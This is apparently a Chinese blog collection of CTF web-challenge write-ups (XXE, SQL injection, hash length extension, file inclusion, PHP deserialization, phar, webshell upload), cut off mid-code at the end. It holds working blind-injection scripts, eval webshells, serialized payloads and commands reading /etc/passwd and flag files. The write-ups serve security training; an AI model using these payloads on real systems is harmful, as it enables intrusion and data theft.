![](https://img-blog.csdnimg.cn/20200513223626379.png)
本题需要不停地传.htaccess来触发，要多加尝试(重试了n次qaq)

参考：[X-NUCA-ezphp记录](https://www.cnblogs.com/tr1ple/p/11439994.html)
[[XNUCA2019Qualifier]EasyPHP](https://www.cnblogs.com/wangtanzhi/p/12296896.html)
[XNUCA2019Qualifier/Web/Ezphp/](https://github.com/NeSE-Team/OurChallenges/tree/master/XNUCA2019Qualifier/Web/Ezphp)

## [NCTF2019]True XML cookbook
也是一个xxe的题目，重点是利用XXE来嗅探渗透内网
先用file协议读取相关的文件 `/etc/passwd` 和 `/etc/hosts`
当我们读取到hosts文件的时候，我们会发现有几个ip地址，我们便来访问一下(到这里应该可以猜到是在打内网了)
![](https://img-blog.csdnimg.cn/20200417201954281.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
访问了第一个，发现报错，说明没有这台主机，那么就多来试几台，发现在它后面的那一台里面就是flag
![](https://img-blog.csdnimg.cn/20200417202520230.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
参考：[[NCTF2019]True XML cookbook](https://www.cnblogs.com/Wanghaoran-s1mple/p/12427342.html)

## [网鼎杯2018]Unfinish
好久没写题了，其实想入门一下逆向，在b站看了一些视频。然后网鼎杯快来了，来看一看真题，试试能不能签到(菜
首先需要登录，猜测有注册页面，为`register.php`
![](https://img-blog.csdnimg.cn/20200426202027112.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
进入后只有一张小姐姐的图片(画的真好！！！)，其他什么信息也没有，最后发现为二次注入。
**注册成功，会得到 302 状态码并跳转至 login.php ；如果注册失败，只会返回 200 状态码。**
使用`username=0'+(select hex(hex(database())))+'0`
得到`373736353632`，两次hex解码后为`web`
至于为什么用两次hex，借用链接的例子自己试了一下，正常的情况：
![](https://img-blog.csdnimg.cn/20200426205229214.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
但十六进制有字母的话，发现到字母后被截断了，那么使用两次hex编码的话就会只得到数字
![](https://img-blog.csdnimg.cn/20200426205409675.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
但得到较长的一串只含有数字的字符串，当这个长字符串转成数字型数据的时候会变成科学计数法，也就是说会丢失数据精度
![](https://img-blog.csdnimg.cn/20200426210024152.png)
使用`substr`每次取10个字符长度与 `'0'`相加，这样就不会丢失数据。但是这里使用逗号 , 会出错，所以可以使用类似 `substr('test' from 1 for 10)` 这种写法来绕过
payload：`0'+(select substr(hex(hex((select * from flag))) from 1 for 10))+'0`  (有长度限制，更改前端即可)
可以慢慢注册得出答案，但我懒，找到了师傅的脚本：
```python
import requests
import string
import re as r

ch = string.ascii_lowercase+string.digits+'-}'+'{'

re = requests.session()
url = 'http://745e50fc-02a5-45ba-9072-9431c79f6004.node3.buuoj.cn/'

def register(email,username):
    url1 = url+'register.php' 
    data = dict(email = email, username = username,password = 'adsl1234')
    html = re.post(url1,data=data)
    html.encoding = 'utf-8'
    return html

def login(email):
    url2 = url+'login.php'
    data = dict(email = email,password = 'adsl1234')
    html = re.post(url2, data=data)
    html.encoding = 'utf-8'
    return html


f = ''
for j in range(0,17):
    payload = "0'^(select substr(hex(hex((select * from flag))) from {} for {}))^'0".format(int(j)*10+1,10)
    email = '{}@qq.com'.format(str(j)+'14')
    html = register(email,payload)
    # print html.text
    html = login(email)
    try:
        res = r.findall(r'<span class="user-name">(.*?)</span>',html.text,r.S)
        flag = res[0][1:].strip()
        print flag
        f += flag
        print f
        print f.decode('hex').decode('hex')
    except:
        print "problem"
```
![](https://img-blog.csdnimg.cn/20200426213549375.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
代码看的一愣一愣的，以后还是要学会自己写各种注入的脚本呀！！！

参考：[【2018年 网鼎杯CTF 第二场】红日安全-网鼎杯WriteUp](https://www.secpulse.com/archives/74776.html)
[2018网鼎杯 三道WEB题 记录~~（二次注入）](https://www.freesion.com/article/9082296656/)
[[网鼎杯] 第二场web writeup](https://www.jianshu.com/p/3acc7d5dd6be)

## [GYCTF2020]Ezsqli
做的时候就不会，看wp写一下这题
1. 过滤了and or关键字
2. 过滤了if
3. 不能用information_schema
4. 没有单独过滤union和select, 但是过滤了union select，union某某某select之类
5. 过滤了sys.schema_auto_increment_columns 
6. 过滤了join

sys中有这两个表`x$schema_flattened_keys,schema_table_statistics`可以获得表名信息，不过发现sys库中带有table的库名大多都会保存表名信息，不过需要mysql5.7以上。可以使用`sys.schema_table_statistics_with_buffer`得到表名，使用Y1ng师傅的盲注脚本：
```python
import requests
from urllib.parse import quote
alphabet = ['{','}','_',',','a','b','c','d','e','f','j','h','i','g','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','G','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','0','1','2','3','4','5','6','7','8','9']
url = 'http://48395c2e-e262-4f53-983b-935120efe324.node3.buuoj.cn/'
target = 'select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema=database()'
res = ''
for i in range(1,50):
    for char in alphabet:
        payload = '2||ascii(substr(({}),{},1))=\'{}\''.format(target, i, ord(char))
        data = {
                'id':payload
                }
        r = requests.post(url=url, data=data)
        text = r.text
        # print(text)
        if 'Nu1L' in r.text:
            res += char
            print(res)
            break
```
![](https://img-blog.csdnimg.cn/20200426224657242.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
得到我们需要的表：`f1ag_1s_h3r3_hhhhh`
预期解是文章中提到的使用 `select concat("a", cast(0 as json))` 来另其返回二进制字符串，又因为mysql比较字符串大小是按位比较的，因此我们需要找到一个ascii字符中比较大的字符也就是 `~` ，这样的话` f~` 始终大于` flag{xx}` ， `e~ `始终小于` flag{xxx} `
使用Smi1e师傅的脚本：
```python
# -*- coding:utf8 -*-
import requests
import string
url = "http://48395c2e-e262-4f53-983b-935120efe324.node3.buuoj.cn/"

def exp1():
    str1 = ('0123456789'+string.ascii_letters+string.punctuation).replace("'","").replace('"','').replace('\\','')
    flag = ''
    select = 'select group_concat(table_name) from sys.x$schema_flattened_keys'
    for j in range(1,40):
        for i in str1:
            paylaod = "1/**/&&/**/(select substr(({}),{},1))='{}'".format(select, j, i)
            #print(paylaod)
            data = {
                'id': paylaod,
            }
            r = requests.post(url,data=data)
            if 'Nu1L' in r.text:
                flag += i
                print(flag)
                break

def exp2():
    str1 = ('-0123456789'+string.ascii_uppercase+string.ascii_lowercase+string.punctuation).replace("'","").replace('"','').replace('\\','')
    flag = ''
    flag_table_name = 'f1ag_1s_h3r3_hhhhh'
    for j in range(1,39):
        for i in str1:
            i = flag+i
            paylaod = "1&&((select 1,concat('{}~',CAST('0' as json))) < (select * from {} limit 1))".format(i,flag_table_name)
            #print(paylaod)
            data = {
                'id': paylaod,
            }
            r = requests.post(url,data=data)

            if 'Nu1L' not in r.text:
                flag=i
                print(flag)
                break

if __name__ == '__main__':
    exp1()
    exp2()
```
还可以使用Y1ng师傅的脚本
>按位比较过程中，因为在里层的for()循环，字典顺序是从ASCII码小到大来枚举并比较的，假设正确值为b，那么字典跑到b的时候b=b不满足payload的大于号，只能继续下一轮循环，c>b此时满足了，题目返回真，出现了Nu1L关键字，这个时候就需要记录flag的值了，但是此时这一位的char是c，而真正的flag的这一位应该是b才对，所以flag += chr(char-1)，这就是为什么在存flag时候要往前偏移一位的原因
```python
import requests
url = 'http://48395c2e-e262-4f53-983b-935120efe324.node3.buuoj.cn/'

def trans(flag):
    res = ''
    for i in flag:
        res += hex(ord(i))
    res = '0x' + res.replace('0x','')
    return res

flag = ''
for i in range(1,500): #这循环一定要大 不然flag长的话跑不完
    hexchar = ''
    for char in range(32, 126):
        hexchar = trans(flag+ chr(char))
        payload = '2||((select 1,{})>(select * from f1ag_1s_h3r3_hhhhh))'.format(hexchar)
        data = {
                'id':payload
                }
        r = requests.post(url=url, data=data)
        text = r.text
        if 'Nu1L' in r.text:
            flag += chr(char-1)
            print(flag)
            break
```
![](https://img-blog.csdnimg.cn/20200426235929432.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
参考：
[无需“in”的SQL盲注](https://nosec.org/home/detail/3830.html)
[i春秋2020新春战“疫”网络安全公益赛GYCTF Writeup 第二天](https://www.gem-love.com/ctf/1782.html)
[聊一聊bypass information_schema](https://www.anquanke.com/post/id/193512)
[新春战疫公益赛-ezsqli-出题小记](https://www.smi1e.top/%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E5%85%AC%E7%9B%8A%E8%B5%9B-ezsqli-%E5%87%BA%E9%A2%98%E5%B0%8F%E8%AE%B0/)

## [NPUCTF2020]ezinclude

查看源码得到提示：`md5($secret.$name)===$pass`
![](https://img-blog.csdnimg.cn/20201014221816752.png#pic_center)
bp抓包，提交`?pass=cookie中的Hash值`试试
![](https://img-blog.csdnimg.cn/20201014222739282.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70#pic_center)
wp说这是一个hash长度扩展攻击，我们不知道secret密钥长度。可以手工hashpump试。也可以写脚本爆破
[哈希长度扩展攻击的简介以及HashPump安装使用方法](https://www.cnblogs.com/pcat/p/5478509.html)

```python
import os
import requests
for i in range(1,12):
    data=os.popen('hashpump -s fa25e54758d5d5c1927781a6ede89f8a -d admin -k '+str(i)+' -a admin').read()
    name=data.split('\n')[0]
    password=data.split('\n')[1].replace('\\x','%')
    result=requests.get('http://c1952ab8-b389-4d44-b2b5-07020d9d4886.node3.buuoj.cn/?name='+password+'&pass='+name).text
    print(result)
```

得到flflflflag.php，抓包访问即可得到一个包含
![](https://img-blog.csdnimg.cn/20201014223241650.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70#pic_center)
使用伪协议读取即可得到源码`?file=php://filter/convert.base64-encode/resource=flflflflag.php`
```php
<?php
$file=$_GET['file'];
if(preg_match('/data|input|zip/is',$file)){
	die('nonono');
}
@include($file);
echo 'include($_GET["file"])';
?>
```
过滤了`data|input|zip` 不能用伪协议直接写马了
这里可以用**php7 segment fault特性**`php://filter/string.strip_tags=/etc/passwd`
php执行过程中出现 Segment Fault，这样如果在此同时上传文件，那么临时文件就会被保存在/tmp目录，不会被删除
```python
import requests
from io import BytesIO
import re
file_data={
	'file': BytesIO("<?php eval($_POST[cmd]);")
}
url="http://c1952ab8-b389-4d44-b2b5-07020d9d4886.node3.buuoj.cn/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd"
try:
	r=requests.post(url=url,files=file_data,allow_redirects=False)
except:
    print(1)
```
扫目录可以得到 dir.php，可以看到这个页面列出了 /tmp下的所有文件。访问dir.php得到临时文件名phpyS228e
![](https://img-blog.csdnimg.cn/20201014224504974.png#pic_center)
先尝试得到phpinfo()，bp抓包即可，得到了flag
![](https://img-blog.csdnimg.cn/20201014225159789.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70#pic_center)
也可以使用蚁剑连接上去，但发现有open_basedir，disable_function，什么都看不到
![](https://img-blog.csdnimg.cn/20201014231356582.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70#pic_center)
直接蚁剑插件即可

参考：
[文件包含&奇技淫巧](https://zhuanlan.zhihu.com/p/62958418)
[LFItoRCE利用总结](https://bbs.zkaq.cn/t/3639.html)
[刷题记录-NPUCTF2020(web部分)](https://blog.csdn.net/weixin_43610673/article/details/105898440)
[NPUCTF_WriteUps](https://github.com/sqxssss/NPUCTF_WriteUps)

## [NPUCTF2020]ReadlezPHP
我反序列化真不行，需要多理解理解这方面的内容。
打开用`view-source:`查看源码，得到信息
![](https://img-blog.csdnimg.cn/20200428212151969.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
进入得到代码，为反序列化
__construct()　　在每次创建新对象时先调用此方法
__destruct() 　　对象的所有引用都被删除或者当对象被显式销毁时执行
```php
<?php
#error_reporting(0);
class HelloPhp
{
    public $a;
    public $b;
    public function __construct(){
        $this->a = "Y-m-d h:i:s";
        $this->b = "date";
    }
    public function __destruct(){
        $a = $this->a;
        $b = $this->b;
        echo $b($a);
    }
}
$c = new HelloPhp;

if(isset($_GET['source']))
{
    highlight_file(__FILE__);
    die(0);
}
@$ppp = unserialize($_GET["data"]); 
```
由于有`echo $b($a);`使用assert()构造反序列化木马，脚本如下：
```php
<?php
class HelloPhp
{
    public $a;
    public $b;
	
}
$c = new HelloPhp;
$c->b = 'assert';
$c->a = 'eval($_POST[a]);';
echo urlencode(serialize($c))."<br/>";
?>
```
得到payload：
```php
?data=O%3A8%3A%22HelloPhp%22%3A2%3A%7Bs%3A1%3A%22a%22%3Bs%3A16%3A%22eval%28%24_POST%5Ba%5D%29%3B%22%3Bs%3A1%3A%22b%22%3Bs%3A6%3A%22assert%22%3B%7D
```
![](https://img-blog.csdnimg.cn/20200428214752358.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
在phpinfo()内查找flag，就得到了。。。。。。
参考：[BUUCTF[NPUCTF2020] web 部分WP](https://www.cnblogs.com/youmg/p/12763212.html)

## [GXYCTF2019]BabysqliV3.0
没想到是弱口令。。。。。
`账号:admin，密码:password`
进入后是一个上传页面，发现有文件包含，使用伪协议：
`?file=php://filter/read=convert.base64-encode/resource=upload`
```php
<?php
error_reporting(0);
class Uploader{
	public $Filename;
	public $cmd;
	public $token;
	

	function __construct(){
		$sandbox = getcwd()."/uploads/".md5($_SESSION['user'])."/";
		$ext = ".txt";
		@mkdir($sandbox, 0777, true);
		if(isset($_GET['name']) and !preg_match("/data:\/\/ | filter:\/\/ | php:\/\/ | \./i", $_GET['name'])){
			$this->Filename = $_GET['name'];
		}
		else{
			$this->Filename = $sandbox.$_SESSION['user'].$ext;
		}

		$this->cmd = "echo '<br><br>Master, I want to study rizhan!<br><br>';";
		$this->token = $_SESSION['user'];
	}

	function upload($file){
		global $sandbox;
		global $ext;

		if(preg_match("[^a-z0-9]", $this->Filename)){
			$this->cmd = "die('illegal filename!');";
		}
		else{
			if($file['size'] > 1024){
				$this->cmd = "die('you are too big (′▽`〃)');";
			}
			else{
				$this->cmd = "move_uploaded_file('".$file['tmp_name']."', '" . $this->Filename . "');";
			}
		}
	}

	function __toString(){
		global $sandbox;
		global $ext;
		// return $sandbox.$this->Filename.$ext;
		return $this->Filename;
	}

	function __destruct(){
		if($this->token != $_SESSION['user']){
			$this->cmd = "die('check token falied!');";
		}
		eval($this->cmd);
	}
}

if(isset($_FILES['file'])) {
	$uploader = new Uploader();
	$uploader->upload($_FILES["file"]);
	if(@file_get_contents($uploader)){
		echo "下面是你上传的文件：<br>".$uploader."<br>";
		echo file_get_contents($uploader);
	}
}
?>
```
### 非预期1
正则写的有问题，多匹配了空格，所以等于没有过滤任何东西，可以直接上传shell，然后通过参数name修改文件名为php文件，直接访问即可
![](https://img-blog.csdnimg.cn/20200428231136416.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
POST提交：`pass=system('cat ../../flag.php');`
![](https://img-blog.csdnimg.cn/2020042823135394.png)
### 非预期2
随后看到了颖师傅的文章，发现有第二个非预期，而且简单粗暴
由于有：`echo file_get_contents($uploader);`，上传后会显示出`$uploader`这个文件的内容，所以只要使`$this->Filename为flag.php` 然后随便传个东西就会得到flag了
![](https://img-blog.csdnimg.cn/20200526002736562.png)
上传后查看源代码即可，只可使用一次！！！
![](https://img-blog.csdnimg.cn/20200526002808443.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)

### 预期
首先是找可控参数，我们找到name参数是通过get传的：
```php
$this->Filename = $_GET['name'];
```
之后在找可以执行命令的点，只要保证token是与user的session相同即可eval执行命令
```php
function __destruct(){
        if($this->token != $_SESSION['user']){
            $this->cmd = "die('check token falied!');";
        }
        eval($this->cmd);
    }
```
我们只要让最后的file_get_contents()执行时读我们可控的flag.php就好了。先随便传一个文件确定我们的文件位置和token
![](https://img-blog.csdnimg.cn/20200526000503100.png)
然后本地生成phar文件，使用师傅的脚本：
```php
<?php
class Uploader{
	public $Filename;
	public $cmd;
	public $token;
}

$o = new Uploader();
$o->cmd = 'highlight_file("/var/www/html/flag.php");'; 
$o->Filename = 'test';
$o->token = 'GXY12b984f2d6e3400454ca54a2cf998753'; //$_SESSION['user']
echo serialize($o);

$phar = new Phar("phar.phar");
$phar->startBuffering();
$phar->setStub("GIF89a"."<?php __HALT_COMPILER(); ?>"); //设置stub，增加gif文件头
$phar->setMetadata($o); //将自定义meta-data存入manifest
$phar->addFromString("test.txt", "test"); //添加要压缩的文件
$phar->stopBuffering();
```
需要php.ini中`phar.readonly`设置为off，然后执行即可获取phar.phar，将文件上传
然后再次上传文件并加上参数 name 从而触发phar序列化
![](https://img-blog.csdnimg.cn/20200526000530410.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)

参考：
[GXYCTF--禁止套娃&BabaySqli v3.0](https://www.jianshu.com/p/2b5e7bd64264)
[GXYCTF2019&GWCTF2019——Writeup](https://blog.csdn.net/qq_42181428/article/details/104402654)
[简析GXY_CTF “BabySqli v3.0”之Phar反序列化](https://www.gem-love.com/ctf/490.html)

## [NCTF2019]SQLi
首先访问robots.txt发现
![](https://img-blog.csdnimg.cn/20200501235542915.png)
访问hint.txt得到源代码：
```php
$black_list = "/limit|by|substr|mid|,|admin|benchmark|like|or|char|union|substring|select|greatest|%00|\'|=| |in|<|>|-|\.|\(\)|#|and|if|database|users|where|table|concat|insert|join|having|sleep/i";
If $_POST['passwd'] === admin's password,
Then you will get the flag;
```
禁用了单引号和注释符，那么只能用`\`来转义单引号了，用分号闭合sql语句,但是后面还有单引号,用`%00`截断(php5)，因为判断的密码是从密码中匹配的,那么不能匹配开头,可以用`^`匹配字符开头
最终正则语句：
`select * from users where username='\' and passwd='||/**/passwd/**/regexp/**/"^参数值";%00'`
师傅的脚本：
```python
import time
import string
import requests
from urllib import parse

passwd = ''
string= string.ascii_lowercase + string.digits + '_'
url = 'http://fcffbbbf-04b1-48b1-b528-a4f6c010bb69.node3.buuoj.cn/'

for n in range(100):
    for m in string:
        time.sleep(0.1)
        data = {
            "username":"\\",
            "passwd":"||/**/passwd/**/regexp/**/\"^{}\";{}".format((passwd+m),parse.unquote('%00'))
        }
        res = requests.post(url,data=data)
        print(data['passwd']+'-'*int(10)+m)
        if 'welcome' in res.text:
            passwd += m
            print(m)
            break
    if m=='_' and 'welcome' not in res.text:
        break
print(passwd)
```
![](https://img-blog.csdnimg.cn/2020050200124551.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
得到密码`you_will_never_know7788990`，登录即可得到flag

参考：[NCTF2019](http://forever404.cn/2020/01/24/NCTF2019/)

## [HarekazeCTF2019]encode_and_encode
题目给出了源码：
```php
 <?php
error_reporting(0);

if (isset($_GET['source'])) {
  show_source(__FILE__);
  exit();
}

function is_valid($str) {
  $banword = [
    // no path traversal
    '\.\.',
    // no stream wrapper
    '(php|file|glob|data|tp|zip|zlib|phar):',
    // no data exfiltration
    'flag'
  ];
  $regexp = '/' . implode('|', $banword) . '/i';
  if (preg_match($regexp, $str)) {
    return false;
  }
  return true;
}

$body = file_get_contents('php://input');
$json = json_decode($body, true);

if (is_valid($body) && isset($json) && isset($json['page'])) {
  $page = $json['page'];
  $content = file_get_contents($page);
  if (!$content || !is_valid($content)) {
    $content = "<p>not found</p>\n";
  }
} else {
  $content = '<p>invalid request</p>';
}

// no data exfiltration!!!
$content = preg_replace('/HarekazeCTF\{.+\}/i', 'HarekazeCTF{&lt;censored&gt;}', $content);
echo json_encode(['content' => $content]); 
```
这里使用师傅的文章解释：
>`is_valid($body)` 对 post 数据检验，导致无法传输 `$banword` 中的关键词，也就无法传输 flag，这里在 json 中，可以使用 Unicode 编码绕过，flag 就等于 `\u0066\u006c\u0061\u0067`
通过检验后，获取 page 对应的文件，并且页面里的内容也要通过 is_valid 检验，然后将文件中 `HarekazeCTF{} `替换为 `HarekazeCTF{&lt;censored&gt;} `，这样就无法明文读取 flag
这里传入 `/\u0066\u006c\u0061\u0067` 后，由于 flag 文件中也包含 flag 关键字，所以返回 not found ，这也无法使用 file://

file_get_contents 是可以触发 php://filter 的，所以考虑使用伪协议读取，对 php 的过滤使用 Unicode 绕过即可
那么构造payload：
```php
{"page":"\u0070\u0068\u0070://filter/convert.base64-encode/resource=/\u0066\u006c\u0061\u0067"}
```
![](https://img-blog.csdnimg.cn/2020052823415349.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
这里hackbar执行不成功，使用postman来传入，最后再base64解码即可
![](https://img-blog.csdnimg.cn/20200528234330739.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
参考：
[HarekazeCTF2019 web](https://xz.aliyun.com/t/6628)


## [GKCTF2020]CheckIN
```php
<?php 
highlight_file(__FILE__);
class ClassName
{
        public $code = null;
        public $decode = null;
        function __construct()
        {
                $this->code = @$this->x()['Ginkgo'];
                $this->decode = @base64_decode( $this->code );
                @Eval($this->decode);
        }

        public function x()
        {
                return $_REQUEST;
        }
}
new ClassName();
```
题目中有`eval($this->decode)`，即执行我们base64解码后的语句
那么尝试phpinfo()，`?Ginkgo=cGhwaW5mbygpOw%3d%3d`，注意==要url编码
![](https://img-blog.csdnimg.cn/20200525192346939.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
发现有disable_functions，需要绕过，首先传入一句话：
```php
@eval($_POST['pass']);   ==>   QGV2YWwoJF9QT1NUWydwYXNzJ10pOw%3d%3d
```
发现根目录有readflag，但由于有disable_functions，无法直接/readflag
![](https://img-blog.csdnimg.cn/20200525192726950.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
使用一个脚本：[PHP 7.0-7.3 disable_functions bypass PoC (*nix only)](https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php)

将`pwn("uname -a") 改为 pwn("/readflag")`传进tmp目录下
![](https://img-blog.csdnimg.cn/2020052519333290.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
然后进行文件包含我们的exp.php文件
![](https://img-blog.csdnimg.cn/20200525193531541.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
参考：[部分WP-GKCTF2020](https://blog.csdn.net/hiahiachang/article/details/106317765)


## [GKCTF2020]cve版签到

Hint：cve-2020-7066
通过%00截断可以让get_headers()请求到错误的主机，那么使用：
`?url=http://127.0.0.1%00www.ctfhub.com`
![](https://img-blog.csdnimg.cn/20200525204640135.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
提示最后要为123，那么改一下即可得到flag，`?url=http://127.0.0.123%00www.ctfhub.com`

![](https://img-blog.csdnimg.cn/20200525204756478.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
参考：[防灾科技学院GKCTF 2020 Writeup](https://www.gem-love.com/ctf/2361.html#CVE%E7%89%88%E7%AD%BE%E5%88%B0)

## [GKCTF2020]老八小超市儿
版本为：Powered by ShopXO v1.8.0 
然后我在网上找到了一篇文章：[渗透测试|shopxo后台全版本获取shell复现](http://www.nctry.com/1660.html)
/admin.php，进入后台，输入默认的账号密码：admin，shopxo即可进入后台
根据文章需要下载主题再传入即可获取shell，写一句话：`<?php @eval($_POST['pass']);?>`
![](https://img-blog.csdnimg.cn/20200525210018348.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
在网站管理处传入：
![](https://img-blog.csdnimg.cn/20200525210131184.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
这里我看了wp才发现地址为：`/public/static/index/default/shell.php`，使用蚁剑连接
![](https://img-blog.csdnimg.cn/20200525211152940.png)
根目录的flag：`flag{this_is_fake_flag/true_flag_in_/root}`，为假的，查看flag.hint得到：
```php
Mon May 25 13:07:57 2020
Get The RooT,The Date Is Useful!
```
找到了一个auto.sh：
```bash
#!/bin/sh
while true; do (python /var/mail/makeflaghint.py &) && sleep 60; done
```
会执行`python /var/mail/makeflaghint.py`，那么我们去看看makeflaghint.py
```python
import os
import io
import time
os.system("whoami")
gk1=str(time.ctime())
gk="\nGet The RooT,The Date Is Useful!"
f=io.open("/flag.hint", "rb+")
f.write(str(gk1))
f.write(str(gk))
f.close()
```
![](https://img-blog.csdnimg.cn/20200525211905463.png)
盲猜flag在root目录下，看了颖师傅的文章可以执行扫描/root目录
```python
f = open("/tmp/fla","w")
for root,dirs,files in os.walk(r"/root"):
    for file in files:
        f.write(os.path.join(root,file))
```
![](https://img-blog.csdnimg.cn/20200525212903147.png)
添加代码来读取`/root/flag`到`/tmp/fla`
```python
f = open("/tmp/fla","w")
a = open('/root/flag','r')
f.write(a.read())
```
![](https://img-blog.csdnimg.cn/20200525213323630.png)
参考：
[部分WP-GKCTF2020](https://blog.csdn.net/hiahiachang/article/details/106317765)
[防灾科技学院GKCTF 2020 Writeup](https://www.gem-love.com/ctf/2361.html#%E8%80%81%E5%85%AB%E5%B0%8F%E8%B6%85%E5%B8%82%E5%84%BF)



## [网鼎杯 2020 青龙组]AreUSerialz
```php
<?php

include("flag.php");

highlight_file(__FILE__);

class FileHandler {

    protected $op;
    protected $filename;
    protected $content;

    function __construct() {
        $op = "1";
        $filename = "/tmp/tmpfile";
        $content = "Hello World!";
        $this->process();
    }

    public function process() {
        if($this->op == "1") {
            $this->write();
        } else if($this->op == "2") {
            $res = $this->read();
            $this->output($res);
        } else {
            $this->output("Bad Hacker!");
        }
    }

    private function write() {
        if(isset($this->filename) && isset($this->content)) {
            if(strlen((string)$this->content) > 100) {
                $this->output("Too long!");
                die();
            }
            $res = file_put_contents($this->filename, $this->content);
            if($res) $this->output("Successful!");
            else $this->output("Failed!");
        } else {
            $this->output("Failed!");
        }
    }

    private function read() {
        $res = "";
        if(isset($this->filename)) {
            $res = file_get_contents($this->filename);
        }
        return $res;
    }

    private function output($s) {
        echo "[Result]: <br>";
        echo $s;
    }

    function __destruct() {
        if($this->op === "2")
